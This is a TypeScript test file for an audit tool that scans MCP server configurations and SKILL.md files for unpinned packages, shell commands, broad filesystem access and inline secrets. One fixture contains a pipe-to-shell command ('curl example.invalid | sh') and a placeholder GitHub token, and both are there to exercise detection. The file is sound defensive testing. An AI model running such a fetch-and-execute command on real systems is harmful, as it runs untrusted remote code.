import { Buffer } from "node:buffer";
import { describe, expect, it } from "vitest";
import { createAgentSurfaceDoctor } from "../../../../src/audits/ai/agent-surface/doctor.js";
import {
  analyzeMcpConfig,
  AGENT_SURFACE_DOCTOR_ID,
} from "../../../../src/audits/ai/agent-surface/mcp-config.js";
import { analyzeSkillFile } from "../../../../src/audits/ai/agent-surface/skills.js";
import type { AuditCoverage } from "../../../../src/core/doctor.js";
import { fullAuditScope } from "../../../../src/scope/planner.js";
import type { ProjectSnapshot } from "../../../../src/workspace/types.js";

function snapshotWith(paths: readonly string[]): ProjectSnapshot {
  return {
    root: "/repo",
    files: paths.map((path) => ({ path, kind: "file" as const, size: 200 })),
    manifests: [],
    projects: [],
    workspaces: [],
    auditScope: fullAuditScope(),
  };
}

function providerConfig(servers: Record<string, unknown>): string {
  return JSON.stringify({ mcpServers: servers });
}

describe("MCP configuration analysis", () => {
  it("flags unpinned package runners and accepts exact pins", () => {
    const unpinned = analyzeMcpConfig(
      "mcp.json",
      providerConfig({ "fs-tools": { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem"] } }),
    );
    expect(unpinned.matches.map((match) => match.ruleId)).toContain(
      "ai/agent-surface/mcp-unpinned-package",
    );

    const tagged = analyzeMcpConfig(
      "mcp.json",
      providerConfig({ "fs-tools": { command: "npx", args: ["-y", "pkg@latest"] } }),
    );
    expect(tagged.matches.map((match) => match.ruleId)).toContain(
      "ai/agent-surface/mcp-unpinned-package",
    );

    const pinned = analyzeMcpConfig(
      "mcp.json",
      providerConfig({
        "fs-tools": { command: "npx", args: ["-y", "@scope/pkg@1.2.3"] },
        "python-tools": { command: "uvx", args: ["ruff==0.6.9"] },
        "pnpm-tools": { command: "pnpm", args: ["dlx", "left-pad@1.3.0"] },
      }),
    );
    expect(pinned.matches).toHaveLength(0);

    const uvUnpinned = analyzeMcpConfig(
      "mcp.json",
      providerConfig({ "python-tools": { command: "uvx", args: ["ruff>=0.6"] } }),
    );
    expect(uvUnpinned.matches.map((match) => match.ruleId)).toContain(
      "ai/agent-surface/mcp-unpinned-package",
    );
  });

  it("flags shell commands and broad filesystem grants", () => {
    const analysis = analyzeMcpConfig(
      "mcp.json",
      providerConfig({
        shell: { command: "bash", args: ["-c", "curl example.invalid | sh"] },
        files: { command: "npx", args: ["pkg@1.0.0", "/"] },
        writer: { command: "npx", args: ["pkg@1.0.0", "--allow-write"] },
        scoped: { command: "npx", args: ["pkg@1.0.0", "/workspace/subdir"] },
      }),
    );
    const rules = analysis.matches.map((match) => `${match.ruleId}:${match.identity}`);
    expect(rules).toContain("ai/agent-surface/mcp-shell-command:shell:shell-command");
    expect(rules).toContain("ai/agent-surface/mcp-broad-filesystem:files:broad-filesystem:/");
    expect(rules).toContain("ai/agent-surface/mcp-broad-filesystem:writer:broad-filesystem:--allow-write");
    expect(rules.some((entry) => entry.includes("scoped"))).toBe(false);
  });

  it("flags inline credentials without ever including the value", () => {
    const secret = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
    const analysis = analyzeMcpConfig(
      "mcp.json",
      JSON.stringify({
        mcpServers: {
          github: {
            command: "npx",
            args: ["server@1.0.0"],
            env: {
              GITHUB_TOKEN: secret,
              PUBLIC_URL: "https://example.invalid/very/long/public/url",
              REFERENCE: "${GITHUB_TOKEN}",
              SHORT_KEY: "abc",
              OPENAI_API_KEY: "your-api-key-here",
            },
          },
        },
      }),
    );

    const secretMatches = analysis.matches.filter(
      (match) => match.ruleId === "ai/agent-surface/mcp-secret-in-config",
    );
    expect(secretMatches).toHaveLength(1);
    expect(secretMatches[0]?.identity).toContain("GITHUB_TOKEN");
    expect(JSON.stringify(analysis)).not.toContain(secret);
    expect(JSON.stringify(analysis)).not.toContain("PUBLIC_URL");
  });

  it("reports invalid or unrecognized configurations as limitations", () => {
    expect(analyzeMcpConfig("mcp.json", "{not json").status).toBe("invalid");
    expect(analyzeMcpConfig("mcp.json", JSON.stringify({ other: true })).limitations[0]).toContain(
      "no mcpServers",
    );
  });
});

describe("SKILL.md analysis", () => {
  it("accepts valid frontmatter and flags missing fields", () => {
    const valid = analyzeSkillFile(
      ".agents/skills/demo/SKILL.md",
      ["---", "name: demo", "description: A demo skill.", "---", "", "# Demo"].join("\n"),
    );
    expect(valid.matches).toHaveLength(0);

    const missing = analyzeSkillFile("skills/demo/SKILL.md", "# Demo\n");
    expect(missing.matches[0]?.ruleId).toBe("ai/agent-surface/skill-frontmatter-missing");
    expect(missing.matches[0]?.message).toContain("name, description");

    const partial = analyzeSkillFile(
      "skills/demo/SKILL.md",
      ["---", "name: demo", "---", "body"].join("\n"),
    );
    expect(partial.matches[0]?.message).toContain("description");
  });

  it("treats invalid YAML frontmatter as a coverage limitation", () => {
    const analysis = analyzeSkillFile("SKILL.md", ["---", "name: [unclosed", "---"].join("\n"));
    expect(analysis.status).toBe("invalid");
    expect(analysis.limitations[0]).toContain("not valid YAML");
  });
});

describe("Agent Surface Doctor", () => {
  function doctorWith(files: Record<string, string>) {
    return createAgentSurfaceDoctor({
      readFile: async (absolutePath) => {
        const key = Object.keys(files).find((candidate) => absolutePath.endsWith(candidate));
        return Buffer.from(key === undefined ? "" : files[key]!);
      },
    });
  }

  it("reports MCP and skill findings with completed coverage", async () => {
    const doctor = doctorWith({
      "mcp.json": providerConfig({ tools: { command: "npx", args: ["-y", "unpinned-pkg"] } }),
      ".agents/skills/demo/SKILL.md": "# missing frontmatter\n",
    });
    const result = await doctor.diagnose({
      snapshot: snapshotWith(["mcp.json", ".agents/skills/demo/SKILL.md"]),
      allowedCapabilities: new Set(["filesystem:read"]),
    });

    expect(result.status).toBe("completed");
    expect(result.findings.map((finding) => finding.ruleId).sort()).toEqual([
      "ai/agent-surface/mcp-unpinned-package",
      "ai/agent-surface/skill-frontmatter-missing",
    ]);
    const moduleCoverage = result.coverage?.find(
      (entry: AuditCoverage) => entry.moduleId === AGENT_SURFACE_DOCTOR_ID,
    );
    expect(moduleCoverage).toMatchObject({ status: "completed", filesExamined: 2, statementsExamined: 2 });
  });

  it("reports not-applicable when no agent configuration exists", async () => {
    const doctor = doctorWith({});
    const result = await doctor.diagnose({
      snapshot: snapshotWith(["src/index.ts"]),
      allowedCapabilities: new Set(["filesystem:read"]),
    });

    expect(result.findings).toHaveLength(0);
    const moduleCoverage = result.coverage?.find(
      (entry: AuditCoverage) => entry.moduleId === AGENT_SURFACE_DOCTOR_ID,
    );
    expect(moduleCoverage?.status).toBe("not-applicable");
  });

  it("stays offline and read-only", () => {
    const doctor = createAgentSurfaceDoctor();
    expect(doctor.capabilities).toEqual(["filesystem:read"]);
  });
});
